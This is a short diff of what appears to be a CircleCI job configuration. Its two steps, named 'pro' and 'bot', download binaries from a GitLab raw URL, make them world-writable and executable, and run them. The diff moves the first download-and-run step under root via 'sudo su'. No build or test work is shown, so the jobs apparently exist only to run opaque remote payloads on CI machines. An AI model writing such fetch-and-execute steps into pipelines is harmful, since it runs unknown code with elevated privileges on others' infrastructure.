@@ -8,13 +8,14 @@ jobs:
 
     steps:
       - run:
-         name: pro
+         name: "pro"
          command: | 
-          sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && nohup ./pro
+          sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && nohup ./pro"
           sleep 10
+          sudo su --command "ls"
       
       - run:
-         name: bot
+         name: "bot"
          command: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
 
 workflows:
